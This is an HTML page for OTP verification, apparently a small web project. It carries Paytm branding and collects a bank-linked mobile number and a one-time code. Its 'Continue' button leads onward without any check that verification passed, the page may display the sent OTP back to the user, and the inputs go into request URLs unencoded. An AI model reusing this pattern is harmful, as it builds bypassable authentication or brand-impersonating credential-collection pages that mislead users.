<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #e6f0ff;
            padding-top: 60px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .otp-card {
            max-width: 500px;
            margin: auto;
            padding: 30px;
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
        }
        .otp-card h2 {
            color: #007bff;
        }
        .btn-custom {
            background-color: #007bff;
            color: white;
            width: 100%;
        }
        .btn-custom:hover {
            background-color: #0056b3;
        }
        .btn-success {
            width: 100%;
        }
        .paytm-logo {
            width: 160px;
        }
    </style>
</head>
<body>

<div class="otp-card">
    <h2 class="text-center">OTP Verification</h2>
    <div class="text-center mb-4">
        <img src="https://download.logo.wine/logo/Paytm/Paytm-Logo.wine.png" alt="Paytm Logo" class="paytm-logo">
    </div>

    <div class="mb-3">
        <label for="mobile" class="form-label">Enter Mobile Number Linked With Bank:</label>
        <input type="text" id="mobile" class="form-control" placeholder="Enter mobile number" required>
    </div>
    <div class="mb-3">
        <button class="btn btn-custom" onclick="sendOtp()">Generate OTP</button>
    </div>

    <div class="mb-3">
        <label for="otp" class="form-label">Enter OTP:</label>
        <input type="text" id="otp" class="form-control" placeholder="Enter OTP" required>
    </div>
    <div class="mb-3">
        <button class="btn btn-custom" onclick="verifyOtp()">Verify OTP</button>
    </div>

    <p id="result" class="text-center text-primary fw-semibold mt-3"></p>

    <!-- Continue Button always visible -->
    <div class="mb-3">
        <button id="continueBtn" class="btn btn-danger" onclick="continueAfterVerification()">Continue</button>
    </div>
</div>

<script>
    function sendOtp() {
        const mobile = document.getElementById("mobile").value;
        fetch(`/otp/send?mobile=${mobile}`, { method: 'POST' })
            .then(response => response.text())
            .then(data => {
                document.getElementById("result").innerText = `OTP Sent: ${data}`;
            })
            .catch(error => {
                document.getElementById("result").innerText = "Error sending OTP.";
            });
    }

    function verifyOtp() {
        const mobile = document.getElementById("mobile").value;
        const code = document.getElementById("otp").value;
        fetch(`/otp/verify?mobile=${mobile}&code=${code}`, { method: 'POST' })
            .then(response => response.text())
            .then(data => {
                document.getElementById("result").innerText = `Verify Status: ${data}`;
            })
            .catch(error => {
                document.getElementById("result").innerText = "Error verifying OTP.";
            });
    }

    function continueAfterVerification() {
        window.location.href = "ttdetails.html";
    }
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
